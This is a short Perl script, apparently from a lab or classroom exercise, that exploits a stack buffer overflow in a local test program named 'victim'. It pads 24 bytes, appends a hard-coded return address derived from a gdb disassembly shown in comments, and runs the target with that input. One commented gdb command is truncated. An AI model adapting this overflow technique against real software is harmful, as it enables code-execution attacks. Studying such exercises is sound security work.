#!/usr/bin/env perl

# This program is the Perl version of attack.
# It's also GPL'ed:-\

# gdb-peda$ r `python disassemble test 
# Dump of assembler code for function test:
#   0x0000000000400584 <+0>:	push   %rbp
#   0x0000000000400585 <+1>:	mov    %rsp,%rbp
#   0x0000000000400588 <+4>:	sub    $0x20,%rsp
#   0x000000000040058c <+8>:	mov    %rdi,-0x18(%rbp)
#
# 0x18 is the number we need.

$code = "A" x 24;
$code .= "\xbe\x05\x40"; #eip, change the correct address for your machine 

print $code;
system("./victim $code");
